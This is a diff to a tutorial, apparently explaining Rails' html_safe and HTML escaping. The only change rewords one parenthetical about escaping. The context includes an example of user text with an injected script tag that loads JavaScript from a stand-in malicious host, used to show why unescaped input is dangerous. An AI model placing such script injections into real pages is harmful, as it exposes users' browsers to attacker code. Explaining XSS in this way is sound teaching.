@@ -46,7 +46,7 @@ for example, they could easily write
 
 > I'm a really nice guy &lt;script src="//horrible.malware.com/ohno.js"&gt;
 
-and if that text wasn't properly *escaped* (meaning the `<` is replaced by `&lt;` for example) before being rendered by some poor user's browser, it would actually load the javascript from that url and execute it. Definitely not safe.
+and if that text wasn't properly *escaped* (i.e., the `<` is replaced by `&lt;`) before being rendered by some poor user's browser, it would actually load the javascript from that url and execute it. Definitely not safe.
 
 Also, just to be clear, if you don't send `#html_safe` to a new `String`, the
 result is *never* safe &mdash; the method doesn't try to *decide* whether the string is safe, so even a perfectly innocuous string is considered unsafe
